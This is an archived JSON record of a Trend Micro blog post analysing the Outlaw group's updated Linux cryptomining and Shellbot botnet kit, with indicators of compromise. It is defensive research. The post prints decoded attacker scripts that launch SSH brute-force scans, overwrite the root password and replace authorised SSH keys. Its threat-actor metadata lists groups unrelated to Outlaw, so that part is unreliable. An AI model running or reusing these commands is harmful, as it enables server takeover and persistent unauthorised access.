{
    "id": "c2d02e33-cfd3-4db3-af80-361b64f198da",
    "created_at": "2022-10-25T16:48:18.837425Z",
    "updated_at": "2025-03-27T02:16:01.184293Z",
    "deleted_at": null,
    "sha1_hash": "fad082e169f6f4bca710eef792f0711c6a9d98cc",
    "title": "",
    "authors": "",
    "file_creation_date": "2020-02-11T08:40:58Z",
    "file_modification_date": "2020-02-11T08:40:58Z",
    "file_size": 2441325,
    "plain_text": "[About TrendLabs Security Intelligence Blog](https://blog.trendmicro.com/trendlabs-security-intelligence/about-us/)\n\nSearch:\n\nGo to…\n\n[Home](http://blog.trendmicro.com/trendlabs-security-intelligence/)\nCategories\n\n[Home  »  Bad Sites  »  Outlaw Updates Kit to Kill Older Miner Versions, Targets More Systems](https://blog.trendmicro.com/trendlabs-security-intelligence/)\n\n# Outlaw Updates Kit to Kill Older Miner Versions, Targets More Systems\n\n[Posted on:February 10, 2020 at 1:00 pm](https://blog.trendmicro.com/trendlabs-security-intelligence/2020/02/)\n[Posted in:Bad Sites, Exploits, Malware, Targeted Attacks, Vulnerabilities](https://blog.trendmicro.com/trendlabs-security-intelligence/category/bad-websites/)\nAuthor:\n[Trend Micro](https://blog.trendmicro.com/trendlabs-security-intelligence/author/trend-micro/)\n\n0\n\n**_By Jindrich Karasek (Threat Researcher)_**\n\nAs we’ve observed with cybercriminal groups that aim to maximize profits for every campaign, silence doesn’t necessarily mean inactivity. It appears hacking group\n[Outlaw, which has been silent for the past few months, was simply developing their toolkit for illicit income sources. While they have been quiet since our](https://blog.trendmicro.com/trendlabs-security-intelligence/perl-based-shellbot-looks-to-target-organizations-via-cc/) [June](https://blog.trendmicro.com/trendlabs-security-intelligence/outlaw-hacking-groups-botnet-observed-spreading-miner-perl-based-backdoor/)\nanalysis, we observed an increase in the group’s activities in December, with updates on the kits’ capabilities reminiscent of their previous [attacks. The updates](https://blog.trendmicro.com/trendlabs-security-intelligence/outlaw-group-distributes-botnet-for-cryptocurrency-mining-scanning-and-brute-force/)\nexpanded scanner parameters and targets, looped execution of files via error messages, improved evasion techniques for scanning activities, and improved mining\nprofits by killing off both the competition and their own previous miners.\n\nWe analyzed the kits, which were designed to steal information from the automotive and finance industries, launch subsequent attacks on already compromised\nsystems, and (possibly) sell stolen information. Comparing this development to their previous attacks, we think Outlaw may be aiming to go after enterprises that\nhave yet to update their systems, assessing security and changes with their previously infected hosts, finding new and old targets, and possibly testing their updates in\nthe wild. We will continue to observe the group’s activities as they target industries from the United States and Europe. Based on the samples we collected and traced\nto 456 distinct IPs, we expect the group to be more active in the coming months as we observed changes on the versions we acquired.\n\n**Routine**\n\nThese new samples targeted Linux- and Unix-based operating systems, vulnerable servers, and internet of things (IoT) devices by exploiting known vulnerabilities\nwith available exploits. This time, the group explored unpatched systems vulnerable to [CVE-2016-8655 and](https://nvd.nist.gov/vuln/detail/CVE-2016-8655) [Dirty COW exploit (CVE-2016-5195) as attack vectors.](https://blog.trendmicro.com/trendlabs-security-intelligence/new-flavor-dirty-cow-attack-discovered-patched/)\nFiles using simple PHP-based web shells were also used to attack systems with weak SSH and Telnet credentials. While no phishing- or social engineering-initiated\nroutines were observed in this campaign, we found multiple attacks over the network that are considered “loud.” These involved large-scale scanning operations of IP\nranges intentionally launched from the command and control (C&C) server. The honeynet graphs, which show activity peaks associated with specific actions, also\nsuggest that the scans were timed.\n\nWe also considered the move as an obfuscation technique, as it was mixed with a lot of script kiddie activities that can easily be mistaken for grey noise online. The\nattackers could hide their activities if they noted the business hours of the intended targets and performed the actions coinciding with said times.\n\n\nGo to…\n\n\n-----\n\nFigure 1. Anomalous properties of a command detected from traffic\n\nFrom the sample we analyzed, attacks started from one virtual private server (VPS) that searches for a vulnerable machine to compromise (previous techniques used\nmalicious URLs or infecting legitimate websites for bot propagation). Once infected, the C&C commands for the infected system launches a loud scanning activity\nand spreads the botnet by sending a “whole kit” of binary files at once with naming conventions same as the ones already in the targeted host, likely banking on\nbreaking through via “security through obscurity.” They attempted to evade traffic inspection by encoding the code for the scanner with base-64. The zombie host\ninitiates the scan — another routine from previous campaigns — but updated with a larger set of parameters and programmed to run in the background. Decoding the\nscanner revealed the following codes:\n\n#!/bin/bash\ncd /tmp\nrm -rf .ssh\nrm -rf .mountfs\nrm -rf .X13-unix\nrm -rf .X17-unix\nrm -rf .X19-unix\nmkdir .X19-unix\ncd .X19-unix\nmv /var/tmp/dota3.tar.gz dota3.tar.gz\ntar xf dota3.tar.gz\nsleep 3s && cd /tmp/.X19-unix/.rsync/c\nnohup /tmp/.X19-unix/.rsync/c/tsm -t 150 -S 6 -s 6 -p 22 -P 0 -f 0 -k 1 -l 1 -i 0 /tmp/up.txt 192.168 >> /dev/null 2>1&\nsleep 8m && nohup /tmp/.X19-unix/.rsync/c/tsm -t 150 -S 6 -s 6 -p 22 -P 0 -f 0 -k 1 -l 1 -i 0 /tmp/up.txt 172.16 >> /dev/null 2>1&\nsleep 20m && cd ..; /tmp/.X19-unix/.rsync/initall 2>1&\nexit 0\n\nThe kit we found is in tgz format, though we have observed some samples disguised as png or jpg. While previous routines took advantage of competing miners’\nactivities and unrelated components to hijack the profit, the latest version of the code attempts to remove all related files and codes from previous infections\n(including their own to make sure the running components are updated, as well as those from other cybercriminals to maximize the resources of the zombie host) and\ncreates a new working directory /tmp/.X19-unix to move the kit and extract the files. The tsm binary then runs in the background, forwarding a series of error\nmessages to /dev/null to keep the code running, ensuring the continuous execution of the code referenced with a set of parameters /tmp/up.txt. The script then waits\n20 minutes before it runs the wrapper script initall:\n\n2e2c9d08c7c955f6ce5e27e70b0ec78a888c276d71a72daa0ef9e3e40f019a1a initall\n\n\n-----\n\nas changing the password to a random string also stored in /tmp/up.txt. In a previous execution (published in June 2019), we observed that dota2 had its own folder\nbut it was hardly executed, indicating that this version is the updated iteration:\n\ncat /proc/cpuinfo | grep name | wc -l\necho \"root:TXhf4ICTayIh\"|chpasswd|bash\necho \"321\" > /var/tmp/.var03522123\nrm -rf /var/tmp/.var03522123\ncat /var/tmp/.var03522123 | head -n 1\ncat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'\nfree -m | grep Mem | awk '{print $2,$3, $4, $5, $6, $7}'\nls -lh $(which ls)\nwhich ls\ncrontab -l\nw\nuname -m\ncat /proc/cpuinfo | grep model | grep name | wc -l\ntop\nuname\nuname -a\nlscpu | grep Model\necho \"root 123\" > /tmp/up.txt\nrm -rf /var/tmp/dota*\n<send Outlaw kit (the archive file) to compromised host via SFTP>\ncat /var/tmp/.systemcache436621\necho \"1\" > /var/tmp/.systemcache436621\ncat /var/tmp/.systemcache436621\nsleep 15s && cd /var/tmp; echo \"IyEvYmluL2Jhc2gKY2QgL3RtcAk.....<shortened>\ncd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3N.....<shortened>\n\nRunning the script removes the remaining files and scripts from previous attacks, keeping a low profile to evade detection. If the system has been previously infected\nwith a cryptominer, it also attempts to kill the running miner and all its related activities.\n\nBased on a bashtemp directory of the latest sample we found, there are other compiled ELF scripts, named init and init2, that loops the kit to keep running:\n\n0c458dfe0a2a01ab300c857fdc3373b75fbb8ccfa23d16eff0d6ab888a1a28f6 init\n\nFigure 3. Running the init ELF script\n\n93ce211a71867017723cd78969aa4cac9d21c3d8f72c96ee3e1b2712c0eea494 init2\n\n\n-----\n\nFigure 4. Running the init2 ELF script\n\nBoth init and init2 scripts make sure all other running mining services are killed, and that all the files in the working directory are executed by giving 777\npermissions.\n\nWe also found the init0 script running; the script cleans out all miners regardless of its origin.\n\nFigure 5. The init0 script running\n\nIt then resets cron and removes possible cache files from other programs, starts scripts and binaries a, init0, and start, and sets the persistence by modifying the\ncrontab. The a binary is a script wrapper to start run, a Perl-obfuscated script for installation of a Shellbot to gain control of the infected system. The Shellbot\ndisguises itself as a process named rsync, commonly the binary seen on many Unix- and Linux-based systems to automatically run for backup and synchronization.\nThis allows the malicious activity to evade detection.\n\n\n-----\n\nFigure 7. Connects to C&C to send current control variables\n\nThe Shellbot script is added to run after the victim’s system reboots, and scripts /a/upd, /b/sync/, and /c/aptitude/ are added to the crontab. However, while we\nobserved the presence of the codes, the functions of upd, sync and aptitude were disabled in the kits’ latest version. It remains unclear whether these are leftover code\nfrom the previous versions or their particular purposes were served.\n\nShellbot is also used to control the botnet, with a command that is sent and run from the C&C to determine if there is a code execution in the shell, the hostname, and\nits architecture. All results and system information collected from the infected system are stored locally in the device for a period before Outlaw retrieves them via\nthe C&C.\n\nWe also found traces of Android Package Kits- (APK-) and Android Debug Bridge (ADB)-based commands that enable cryptocurrency mining activities in Androidbased TVs:\n\nFigure 8. The tv.apk app’s Android manifest XML file\n\n**Conclusion**\n\nSince discovering the operations of this group in 2018, Outlaw continues to use scripts, codes, and commands that have been previously used and deployed. These\nroutines are indicative of the group’s aim to get quantitative returns through varied cybercriminal profit streams. This was also reinforced by their naming\nconventions, wherein different versions are simply named after the code iterations, following a specific format regardless of the actual function of the code.\n\nFurthermore, based on the group’s use of dated exploits as vectors that companies would have likely addressed with monitoring and regular patching schedules, it\nappears that they’re going after enterprises who have yet to patch their systems, as well as companies with internet-facing systems with weak to no monitoring of\ntraffic and activities. Considering the amount of resources needed to deploy all the necessary patches for an enterprise (such as quality testing and operations\nalignment), which implies costly downtime for operations and the hesitation to update all systems immediately, Outlaw may find even more targets and victims for\ntheir updated botnets every time there is a patch released and waiting to be downloaded. Save for a few iteration updates, combinations from previous deployments,\nand using the routines repetitively for every campaign, we found very little changes in the group’s toolkit, which allowed various honeypots across the Eastern\nEuropean region to detect many of the sent binaries.\n\nMeanwhile, the group uses a wide range of IP addresses as input for scanning activities that are grouped by country, allowing them to attack certain regions or areas\n[within particular periods of the year, as previously observed. We think the group has likely become more enterprising, and learned to take advantage of some details](https://blog.trendmicro.com/trendlabs-security-intelligence/perl-based-shellbot-looks-to-target-organizations-via-cc/)\nfrom their previous campaigns to maximize profit opportunities while exerting minimal effort. By shaping the attack, the group may be able to create niches in the\nunderground, catering to the specific needs of their customers. Also aware of the existing laws in Europe, they can avoid prosecution in certain countries as long as\nthey avoid attacking them. Collection of results and data from scanning in this manner might be easier to sort (while allowing them to stay under the radar), as\ncompared to getting feedback from zombie bots deployed around the world simultaneously.\n\nWe will continue to monitor this hacking group’s activities and their toolkit’s developments. Outlaw’s attack routines may not be new, but it still serves as a reminder\nfor enterprises to update their systems regularly. Legacy system users may use their providers’ virtual patches. Users are advised to close unused ports, to secure ports\nand other internet-facing devices that are regularly open for system administrators’ support. Users can also adopt a [multilayered security solution that can protect](https://redirect.viglink.com/?format=go&jsonp=vglnk_155989677683310&key=0d3176c012db018d69225ad1c36210fa&libId=jwlu9fn50102jdmu000DA15x60cfc&subId=f9f1a771608a24e84c49a8532e282dc1&cuid=f9f1a771608a24e84c49a8532e282dc1&loc=https%3A%2F%2Fblog.trendmicro.com%2Ftrendlabs-security-intelligence%2Fblacksquid-slithers-into-servers-and-drives-with-8-notorious-exploits-to-drop-xmrig-miner%2F&v=1&out=https%3A%2F%2Fwww.trendmicro.com%2Fen_us%2Fbusiness.html%3F_ga%3D2.258317453.60506155.1559896749-1577535324.1526018629&ref=https%3A%2F%2Fblog.trendmicro.com%2Ftrendlabs-security-intelligence%2F%3F_ga%3D2.258317453.60506155.1559896749-1577535324.1526018629&title=BlackSquid%20Slithers%20Into%20Servers%20and%20Drives%20With%208%20Notorious%20Exploits%20to%20Drop%20XMRig%20Miner%20-%20TrendLabs%20Security%20Intelligence%20Blog&txt=multilayered%20protection%20system)\nsystems from the gateway to the endpoint, actively blocking malicious URLs by employing filtering, behavioral analysis, and custom sandboxing.\n\n**Trend Micro solutions**\n\nUsers can consider adopting security solutions that can defend against malicious bot-related activities such as Outlaw’s through a cross-generational blend of threat\n[defense techniques. Trend Micro™ XGen™ security provides high-fidelity machine learning that can secure the](https://www.trendmicro.com/en_us/business/products/all-solutions.html) [gateway and](https://www.trendmicro.com/en_us/business/products/user-protection/sps.html) [endpoints, and protect physical, virtual,](https://www.trendmicro.com/en_us/business/products/user-protection/sps.html)\nand cloud workloads. With technologies that employ web/URL filtering, behavioral analysis, and custom sandboxing, XGen security offers protection against everchanging threats that bypass traditional controls and exploit known and unknown vulnerabilities. A multi-layered connected [network defense and complete visibility](https://www.trendmicro.com/en_ph/business/products/network.html)\ninto all network traffic, in addition to [next-generation intrusion prevention system (NGIPS), can help organizations stay a step ahead of threats that could compromise](https://www.trendmicro.com/vinfo/ph/security/news/security-technology/guide-to-network-threats-strengthening-network-perimeter-defenses-with-next-generation-intrusion-prevention)\nintangible assets. XGen security also powers Trend Micro’s suite of security solutions: [Hybrid Cloud Security and](https://www.trendmicro.com/en_us/business/products/hybrid-cloud/cloud-security.html) [User Protection.](https://www.trendmicro.com/en_us/business/products/user-protection.html)\n\n**_Additi_** **_l i_** **_i ht b A_** **_t R_** **_ill_** **_II_**\n\n\n-----\n\n**SHA256** **Description** **Detection Name**\n1800de5f0fb7c5ef3c0d9787260ed61bc324d861bc92d9673d4737d1421972 Cryptocurrency\n\n[Trojan.SH.MALXMR.UWEJP](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/Trojan.SH.MALXMR.UWEJP)\n\naa miner\n\nb68bd3a54622792200b931ee5eebf860acf8b24f4b338b5080193573a81c74\nShellbot [Backdoor.SH.SHELLBOT.AA](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/Backdoor.SH.SHELLBOT.AA)\n7d\n\n620635aa9685249c87ead1bb0ad25b096714a0073cfd38a615c5eb63c37619\nTool [Trojan.Linux.SSHBRUTE.B](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/Trojan.Linux.SSHBRUTE.B)\n76\n\nfc57bd66c27066104cd6f8962cd463a5dfc05fa59b76b6958cddd3542dfe6a9 Cryptocurrency [Coinminer.Linux.MALXMR.SMD](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/Coinminer.Linux.MALXMR.SMDSL32)\na miner SL32\n\n649280bd4c5168009c1cff30e5e1628bcf300122b49d339e3ea3f3b6ff8f9a7 Cryptocurrency Coinminer.Linux.MALXMR.SMD\n9 miner SL64\n\n\nURLs\n\n159[.]203[.]141[.]208\n\n104[.]236[.]192[.]6\n\n45[.]9[.]148[.]129:80    Miner pool\n\n45[.]9[.]148[.]125:80    Miner pool\n\nhttp://www[.]minpop[.]com/sk12pack/idents.php     Command and control\n\nhttp://www[.]minpop[.]com/sk12pack/names.php     Command and control\n\n**_MITRE ATT&CK Matrix™_**\n\n## Related Posts:\n\n**[Monero Miner-Malware Uses RADMIN, MIMIKATZ to Infect, Propagate via Vulnerability](https://blog.trendmicro.com/trendlabs-security-intelligence/monero-miner-malware-uses-radmin-mimikatz-to-infect-propagate-via-vulnerability/)**\n**[Operation ENDTRADE: Finding Multi-Stage Backdoors that TICK](https://blog.trendmicro.com/trendlabs-security-intelligence/operation-endtrade-finding-multi-stage-backdoors-that-tick/)**\n**[Outlaw Hacking Group’s Botnet Observed Spreading Miner, Perl-Based Backdoor](https://blog.trendmicro.com/trendlabs-security-intelligence/outlaw-hacking-groups-botnet-observed-spreading-miner-perl-based-backdoor/)**\n**[‘Purple Fox’ Fileless Malware with Rookit Component Delivered by Rig Exploit Kit Now Abuses PowerShell](https://blog.trendmicro.com/trendlabs-security-intelligence/purple-fox-fileless-malware-with-rookit-component-delivered-by-rig-exploit-kit-now-abuses-powershell/)**\n\n\n-----\n\nLearn how to protect Enterprises, Small Businesses, and Home Users from ransomware:\n\n[ENTERPRISE](http://www.trendmicro.com/us/security-intelligence/enterprise-ransomware/index.html) » [SMALL BUSINESS](http://www.trendmicro.com/us/security-intelligence/small-business-ransomware/index.html) » [HOME](http://www.trendmicro.com/us/home/consumer-ransomware/index.html) »\n\n\nTags: [ExploitshackingminerMoneroOutlaw](https://blog.trendmicro.com/trendlabs-security-intelligence/tag/exploits/)\n\n**0 Comments** **[TrendLabs](https://disqus.com/home/forums/trendlabs/)** [1](https://disqus.com/home/inbox/) **Login**\n\n\n Recommend\n\n\nt Tweet f Share **Sort by Best**\n\n\n### Start the discussion…\n\n\n**LOG IN WITH** **OR SIGN UP WITH DISQUS**\n\n\nName\n\n\nBe the first to comment.\n\n✉ **Subscribe** d **[Add Disqus to your siteAdd DisqusAdd](https://publishers.disqus.com/engage?utm_source=trendlabs&utm_medium=Disqus-Footer)** 🔒 **[Disqus' Privacy PolicyPrivacy PolicyPrivacy](https://disqus.com/)**\n\n### Security Predictions for 2020\n\nCybersecurity in 2020 will be viewed through many lenses — from differing attacker motivations and cybercriminal arsenal to technological developments and\nglobal threat intelligence — only so defenders can keep up with the broad range of threats.\n[Read our security predictions for 2020.](https://www.trendmicro.com/vinfo/us/security/research-and-analysis/predictions/2020)\n\n### Business Process Compromise\n\nAttackers are starting to invest in long-term operations that target specific processes enterprises rely on. They scout for vulnerable practices, susceptible\nsystems and operational loopholes that they can leverage or abuse. To learn more, [read our Security 101: Business Process Compromise.](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/security-101-business-process-compromise)\n\n### Recent Posts\n\n[Outlaw Updates Kit to Kill Older Miner Versions, Targets More Systems](https://blog.trendmicro.com/trendlabs-security-intelligence/outlaw-updates-kit-to-kill-older-miner-versions-targets-more-systems/)\n[Malicious Optimizer and Utility Android Apps on Google Play Communicate with Trojans that Install Malware, Perform Mobile Ad Fraud](https://blog.trendmicro.com/trendlabs-security-intelligence/malicious-apps-on-google-play-communicate-with-trojans-install-malware-perform-mobile-ad-fraud/)\n[Security Analysis of Devices That Support SCPI and VISA Protocols](https://blog.trendmicro.com/trendlabs-security-intelligence/security-analysis-of-devices-that-support-scpi-and-visa-protocols/)\n[January Patch Tuesday: Update List Includes Fixes for Internet Explorer, Remote Desktop, Cryptographic Bugs](https://blog.trendmicro.com/trendlabs-security-intelligence/january-patch-tuesday-update-list-includes-fixes-for-internet-explorer-remote-desktop-cryptographic-bugs/)\n[First Active Attack Exploiting CVE-2019-2215 Found on Google Play, Linked to SideWinder APT Group](https://blog.trendmicro.com/trendlabs-security-intelligence/first-active-attack-exploiting-cve-2019-2215-found-on-google-play-linked-to-sidewinder-apt-group/)\n\n### Popular Posts\n\n[Security Analysis of Devices That Support SCPI and VISA Protocols](https://blog.trendmicro.com/trendlabs-security-intelligence/security-analysis-of-devices-that-support-scpi-and-visa-protocols/)\n\n[January Patch Tuesday: Update List Includes Fixes for Internet Explorer, Remote Desktop, Cryptographic Bugs](https://blog.trendmicro.com/trendlabs-security-intelligence/january-patch-tuesday-update-list-includes-fixes-for-internet-explorer-remote-desktop-cryptographic-bugs/)\n\n[First Active Attack Exploiting CVE-2019-2215 Found on Google Play, Linked to SideWinder APT Group](https://blog.trendmicro.com/trendlabs-security-intelligence/first-active-attack-exploiting-cve-2019-2215-found-on-google-play-linked-to-sidewinder-apt-group/)\n\n[Why Running a Privileged Container in Docker Is a Bad Idea](https://blog.trendmicro.com/trendlabs-security-intelligence/why-running-a-privileged-container-in-docker-is-a-bad-idea/)\n\n[Looking into Attacks and Techniques Used Against WordPress Sites](https://blog.trendmicro.com/trendlabs-security-intelligence/looking-into-attacks-and-techniques-used-against-wordpress-sites/)\n\n### Stay Updated\n\nEmail Subscription\n\n\nYour email here\n\n\nYour email here\n\n\n-----\n\n[For Business](http://www.trendmicro.com/us/business/index.html)\n|\n[Security Intelligence](http://www.trendmicro.com/us/security-intelligence/index.html)\n|\n[About Trend Micro](http://www.trendmicro.com/us/about-us/index.html)\n\n[Asia Pacific Region (APAC): Australia /](http://www.trendmicro.com.au/au/home/index.html) [New Zealand, 中国, ⽇本, 대한민국, 台灣](http://www.trendmicro.co.nz/nz/home/index.html)\nLatin America Region (LAR): [Brasil, México](http://br.trendmicro.com/br/home/index.html)\nNorth America Region (NABU): [United States, Canada](http://www.trendmicro.com/us/index.html)\nEurope, Middle East, & Africa Region (EMEA): [France, Deutschland / Österreich / Schweiz, Italia, Россия, España, United Kingdom / Ireland](http://www.trendmicro.fr/)\n\n[Privacy Statement](http://www.trendmicro.com/us/about-us/legal-policies/privacy-statement/index.html)\n[Legal Policies](http://www.trendmicro.com/us/about-us/legal-policies/index.html)\n\nCopyright © 2020 Trend Micro Incorporated. All rights reserved.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2020/2020.02.10_Outlaw_Updates/Outlaw%20Updates%20Kit%20to%20Kill%20Older%20Miner%20Versions%2C%20Targets%20More%20Systems.pdf"
    ],
    "report_names": [
        "Outlaw Updates Kit to Kill Older Miner Versions, Targets More Systems"
    ],
    "threat_actors": [
        {
            "id": "42a6a29d-6b98-4fd6-a742-a45a0306c7b0",
            "created_at": "2022-10-25T15:50:23.710403Z",
            "updated_at": "2025-03-27T02:00:55.531313Z",
            "deleted_at": null,
            "main_name": "Silence",
            "aliases": [
                "Whisper Spider"
            ],
            "source_name": "MITRE:Silence",
            "tools": [
                "Winexe",
                "SDelete"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "88e53203-891a-46f8-9ced-81d874a271c4",
            "created_at": "2022-10-25T16:07:24.191982Z",
            "updated_at": "2025-03-27T02:02:10.13692Z",
            "deleted_at": null,
            "main_name": "Silence",
            "aliases": [
                "ATK 86",
                "Contract Crew",
                "TAG-CR8",
                "TEMP.TruthTeller",
                "Whisper Spider"
            ],
            "source_name": "ETDA:Silence",
            "tools": [
                "EDA",
                "EmpireDNSAgent",
                "Farse",
                "Ivoke",
                "Kikothac",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Meterpreter",
                "ProxyBot",
                "ReconModule",
                "Silence.Downloader",
                "TiniMet",
                "TinyMet",
                "TrueBot",
                "xfs-disp.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "6b9fc913-06c6-4432-8c58-86a3ac614564",
            "created_at": "2022-10-25T16:07:24.185236Z",
            "updated_at": "2025-03-27T02:02:10.135195Z",
            "deleted_at": null,
            "main_name": "SideWinder",
            "aliases": [
                "APT-C-17",
                "APT-Q-39",
                "BabyElephant",
                "GroupA21",
                "HN2",
                "Hardcore Nationalist",
                "Rattlesnake",
                "Razor Tiger",
                "SideWinder",
                "T-APT-04"
            ],
            "source_name": "ETDA:SideWinder",
            "tools": [
                "BroStealer",
                "Capriccio RAT",
                "callCam"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bbefc37d-475c-4d4d-b80b-7a55f896de82",
            "created_at": "2022-10-25T15:50:23.571783Z",
            "updated_at": "2025-03-27T02:00:55.502112Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "BRONZE BUTLER",
                "REDBALDKNIGHT"
            ],
            "source_name": "MITRE:BRONZE BUTLER",
            "tools": [
                "Mimikatz",
                "build_downer",
                "cmd",
                "ABK",
                "at",
                "BBK",
                "schtasks",
                "down_new",
                "Daserf",
                "ShadowPad",
                "Windows Credential Editor",
                "gsecdump"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "173f1641-36e3-4bce-9834-c5372468b4f7",
            "created_at": "2022-10-25T15:50:23.349637Z",
            "updated_at": "2025-03-27T02:00:55.450857Z",
            "deleted_at": null,
            "main_name": "Sidewinder",
            "aliases": [
                "Sidewinder",
                "T-APT-04"
            ],
            "source_name": "MITRE:Sidewinder",
            "tools": [
                "Koadic"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d0c0a5ea-3066-42a5-846c-b13527f64a3e",
            "created_at": "2023-01-06T13:46:39.080551Z",
            "updated_at": "2025-03-27T02:00:02.992026Z",
            "deleted_at": null,
            "main_name": "RAZOR TIGER",
            "aliases": [
                "SideWinder",
                "APT-C-17",
                "T-APT-04"
            ],
            "source_name": "MISPGALAXY:RAZOR TIGER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1666716498,
    "ts_updated_at": 1743041761,
    "ts_creation_date": 1581410458,
    "ts_modification_date": 1581410458,
    "files": {
        "pdf": "https://archive.orkl.eu/fad082e169f6f4bca710eef792f0711c6a9d98cc.pdf",
        "text": "https://archive.orkl.eu/fad082e169f6f4bca710eef792f0711c6a9d98cc.txt",
        "img": "https://archive.orkl.eu/fad082e169f6f4bca710eef792f0711c6a9d98cc.jpg"
    }
}